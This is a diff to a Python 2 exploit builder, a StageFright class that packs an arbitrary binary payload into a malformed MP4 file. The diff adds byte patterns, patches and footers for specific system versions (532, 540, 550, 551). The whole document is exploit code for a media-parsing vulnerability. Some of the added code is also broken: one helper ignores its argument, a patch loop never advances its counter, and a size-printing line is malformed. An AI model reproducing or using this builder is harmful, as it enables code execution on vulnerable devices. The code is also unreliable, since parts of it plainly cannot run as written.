@@ -1,6 +1,7 @@
 class StageFright(object):
-    def __init__(self, bin_data):
+    def __init__(self, bin_data, version):
         self.mp4_size = 41224
+        self.system_version = version
 
         self.headerBytes = bytearray([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x33, 0x67, 0x70, 0x36, 0x00, 0x00, 0x01, 0x00,
                                                     0x69, 0x73, 0x6F, 0x6D, 0x33, 0x67, 0x53, 0x36, 0x00, 0x00, 0x90, 0x00, 0x6D, 0x6F, 0x6F, 0x76,
@@ -69,7 +70,11 @@ class StageFright(object):
             "value": 0x48
         }
 
-        self.Footer_Magic_Offset = 30976
+        self.Footer_Magic = {
+            "offset": 30976,
+            "value": bytearray([0x00, 0x00, 0x01, 0xC5, 0x6D, 0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x01, 0x74, 0x78, 0x33, 0x67,
+                                                    0x00, 0x00, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x00])
+        }
 
         self.v532_Footer = {
             "offset": 30976,
@@ -214,13 +219,44 @@ class StageFright(object):
             i += spacing
         return
 
+    def pattern_bytes(self, bytes, offset, size, spacing):
+        byteChoice = 0
+        i = 0
+        while i < size:
+            self.mp4_data[i + offset] = self.bin_data[byteChoice]
+            byteChoice += 1
+            if byteChoice >= len(bytes):
+                byteChoice = 0
+            i += spacing
+        return
+
+    def write_bin_size(self):
+        print (self.bin_data).to_bytes(4, byteorder='big')
+
     def convert(self):
         if len(self.bin_data) > 29832:
-            print "The payload is bigger than 29832 bytes. Exiting"
+            print "The payload is bigger than 29832 bytes. Exiting..."
             return -1
         else:
             self.write_bytes(self.headerBytes, 0)
             self.fill_bytes(self.Header_Pattern["value"], self.Header_Pattern["offset"], self.Header_Pattern["length"], self.Header_Pattern["spacing"])
             self.write_bytes(self.BinLead["bytes"], self.BinLead["offset"])
             self.fill_bytes(self.Bin_Fill["value"], self.Bin_Fill["offset"], self.Bin_Fill["length"], self.Bin_Fill["spacing"])
+
+            if self.system_version == 532 or self.system_version == 540:
+                self.pattern_bytes(self.v532_Pattern["value"], self.v532_Pattern["offset"], self.v532_Pattern["length"], self.v532_Pattern["spacing"])
+                self.write_bytes(self.v532_Footer["value"], self.v532_Footer["offset"])
+                if self.system_version == 532:
+                    i = 0
+                    while i < len(self.v532_Header_Patch["offsets"]):
+                        self.mp4_data[self.v532_Header_Patch["offsets"][i] ] = self.v532_Header_Patch["values"][i]
+            elif self.system_version == 550 or self.system_version == 551:
+                self.pattern_bytes(self.v550_Pattern["value"], self.v550_Pattern["offset"], self.v550_Pattern["length"], self.v550_Pattern["spacing"])
+                self.write_bytes(self.v550_Footer["value"], self.v550_Footer["offset"])
+            else:
+                print "The system version is not supported! Exiting..."
+            self.fill_bytes(self.Footer_Fill["value"], self.Footer_Fill["offset"], self.Footer_Fill["length"], self.Footer_Fill["spacing"])
+            self.write_bytes(self.Footer_Magic["value"], self.Footer_Magic["offset"])
+            self.write_bytes(self.BinLead["bytes"], self.BinLead["offset"])
+            self.write_bin_size()
             return self.mp4_data
